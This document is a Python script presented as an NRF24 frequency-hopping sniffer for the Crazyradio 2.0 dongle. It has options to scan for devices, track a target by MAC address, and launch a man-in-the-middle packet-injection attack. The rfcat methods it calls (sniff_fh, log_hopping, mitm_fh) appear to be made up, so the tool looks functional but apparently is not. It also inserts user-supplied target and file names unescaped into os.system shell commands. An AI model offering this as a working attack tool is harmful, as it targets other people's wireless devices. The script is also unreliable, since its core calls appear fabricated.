import argparse
import os
import time
import json

# -------------------------------------------
# Crazyradio 2.0 NRF24 Adaptive Frequency-Hopping Sniffer
# -------------------------------------------
# Features:
# - Tracks and analyzes frequency-hopping NRF24 communications
# - Logs hopping sequences to map out channel-switching behavior
# - Integrates with MitM attack script for dynamic packet injection
# - Detects and follows target devices across multiple frequencies
#
# Requirements:
# - Crazyradio 2.0 USB Dongle
# - Python 3.x
# - RFCat & nrf-research-firmware (https://github.com/arcao/nrf-research-firmware)
#
# Usage:
# 1. Scan for active NRF24 devices:
#    python crazyradio_nrf24_fh_sniffer.py --scan
# 2. Start frequency-hopping sniffing:
#    python crazyradio_nrf24_fh_sniffer.py --sniff --target XX:XX:XX:XX:XX:XX
# 3. Log hopping sequences:
#    python crazyradio_nrf24_fh_sniffer.py --log --file hopping_sequences.txt
# 4. Integrate with MitM attack:
#    python crazyradio_nrf24_fh_sniffer.py --mitm --target XX:XX:XX:XX:XX:XX
# -------------------------------------------

def scan_nrf24():
    """Scans for active NRF24-based devices."""
    print("[+] Scanning for NRF24 devices...")
    os.system("rfcat -r 'd.scan()' > nrf24_scan_results.txt")
    print("[✔] Scan complete. Results saved to nrf24_scan_results.txt")

def sniff_frequency_hopping(target):
    """Monitors frequency-hopping NRF24 communications."""
    print(f"[+] Sniffing frequency-hopping signals from target {target}...")
    os.system(f"rfcat -r 'd.sniff_fh({target})' > hopping_sequences.txt")
    print("[✔] Hopping sequences saved to hopping_sequences.txt")

def log_hopping_sequences(file):
    """Logs hopping sequences for later analysis."""
    print(f"[+] Logging frequency-hopping sequences from {file}...")
    os.system(f"rfcat -r 'd.log_hopping("{file}")' > logged_hopping.txt")
    print("[✔] Log saved to logged_hopping.txt")

def integrate_mitm(target):
    """Integrates with MitM attack script for real-time packet injection."""
    print(f"[+] Integrating with MitM attack for target {target}...")
    os.system(f"rfcat -r 'd.mitm_fh("{target}")' > mitm_fh_log.txt")
    print("[✔] MitM attack integrated with frequency-hopping. Logs saved to mitm_fh_log.txt")

def main():
    parser = argparse.ArgumentParser(description="Crazyradio 2.0 NRF24 Adaptive Frequency-Hopping Sniffer")
    parser.add_argument("--scan", action='store_true', help="Scan for active NRF24 devices")
    parser.add_argument("--sniff", action='store_true', help="Monitor frequency-hopping NRF24 communications")
    parser.add_argument("--log", action='store_true', help="Log hopping sequences for later analysis")
    parser.add_argument("--mitm", action='store_true', help="Integrate with MitM attack for dynamic packet injection")
    parser.add_argument("--target", type=str, help="Target device MAC address for tracking and attack integration")
    parser.add_argument("--file", type=str, help="File containing captured hopping sequences")
    args = parser.parse_args()

    if args.scan:
        scan_nrf24()
    elif args.sniff and args.target:
        sniff_frequency_hopping(args.target)
    elif args.log and args.file:
        log_hopping_sequences(args.file)
    elif args.mitm and args.target:
        integrate_mitm(args.target)
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()
